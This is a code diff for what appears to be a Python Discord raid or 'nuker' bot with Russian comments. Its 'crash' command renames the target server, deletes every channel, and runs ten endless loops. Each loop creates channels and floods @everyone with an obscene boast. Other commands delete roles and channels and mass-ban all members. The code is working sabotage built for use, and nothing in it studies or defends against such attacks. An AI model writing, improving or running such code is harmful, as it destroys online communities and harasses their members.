@@ -16,23 +16,49 @@ async def on_ready():
 
 @bot.command(name="crash")
 async def crash(ctx):
-    """Штурм, смена названия, удаление, бесконечные роли и спам."""
-    await ctx.message.delete()
+    """Штурм, упор на максимальное создание каналов и спам текста без создания ролей."""
     guild = ctx.guild
 
-    # 1. Изменение названия сервера
     try:
         await guild.edit(name="crashed by stricxyyy")
     except Exception:
         pass
 
-    # 2. Удаление доступных каналов и ролей параллельно
+    delete_tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+
+    async def create_and_flood():
+        while True:
+            try:
+                channel = await guild.create_text_channel("Crashed-b1tch")
+                await asyncio.gather(*(channel.send("@everyone сервер вьебан by stricxyyy") for _ in range(5)))
+            except Exception:
+                await asyncio.sleep(0.05)
+
+    task = asyncio.create_task(asyncio.gather(*(create_and_flood() for _ in range(10))))
+    active_tasks.add(task)
+    try:
+        await task
+    except asyncio.CancelledError:
+        pass
+    finally:
+        active_tasks.discard(task)
+
+@bot.command(name="crashold")
+async def crashold(ctx):
+    """Старый метод: штурм с созданием каналов, ролей и спамом."""
+    guild = ctx.guild
+
+    try:
+        await guild.edit(name="crashed by stricxyyy")
+    except Exception:
+        pass
+
     delete_tasks = [channel.delete() for channel in guild.channels] + \
                    [role.delete() for role in guild.roles if role < ctx.me.top_role and not role.managed]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    # 3. Бесконечное создание каналов и ролей, а также спам
-    async def create_and_flood():
+    async def create_and_flood_old():
         while True:
             try:
                 channel_task = guild.create_text_channel("Crashed-b1tch")
@@ -43,7 +69,7 @@ async def crash(ctx):
             except Exception:
                 await asyncio.sleep(0.1)
 
-    task = asyncio.create_task(asyncio.gather(*(create_and_flood() for _ in range(5))))
+    task = asyncio.create_task(asyncio.gather(*(create_and_flood_old() for _ in range(5))))
     active_tasks.add(task)
     try:
         await task
@@ -55,15 +81,12 @@ async def crash(ctx):
 @bot.command(name="sorry")
 async def sorry(ctx):
     """Очистка всех каналов/ролей и создание канала с извинением."""
-    await ctx.message.delete()
     guild = ctx.guild
 
-    # 1. Удаление каналов и ролей
     delete_tasks = [channel.delete() for channel in guild.channels] + \
                    [role.delete() for role in guild.roles if role < ctx.me.top_role and not role.managed]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    # 2. Создание канала с извинением
     try:
         channel = await guild.create_text_channel("apology")
         await channel.send("простите @everyone")
@@ -73,7 +96,6 @@ async def sorry(ctx):
 @bot.command(name="clear")
 async def clear(ctx):
     """Удаление всех каналов на сервере."""
-    await ctx.message.delete()
     guild = ctx.guild
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
@@ -81,7 +103,6 @@ async def clear(ctx):
 @bot.command(name="stop")
 async def stop(ctx):
     """Остановка активных процессов краша."""
-    await ctx.message.delete()
     for task in active_tasks:
         task.cancel()
     active_tasks.clear()
@@ -89,7 +110,6 @@ async def stop(ctx):
 @bot.command(name="ban")
 async def ban(ctx):
     """Массовый бан всех участников сервера."""
-    await ctx.message.delete()
     guild = ctx.guild
 
     ban_tasks = [
